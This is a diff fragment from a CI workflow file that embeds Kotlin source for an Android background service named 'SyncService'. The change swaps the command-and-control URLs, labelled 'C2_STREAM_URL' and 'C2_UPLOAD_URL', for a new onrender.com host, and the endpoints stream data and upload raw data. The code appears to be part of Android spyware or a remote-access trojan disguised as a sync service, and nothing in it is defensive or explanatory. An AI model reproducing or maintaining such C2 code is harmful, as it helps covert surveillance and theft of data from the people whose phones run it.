@@ -127,8 +127,8 @@ jobs:
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-              private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
-              private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
+              private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
+              private val C2_UPLOAD_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
               private var lastHeartbeatSent = 0L
 
               override fun onCreate() {
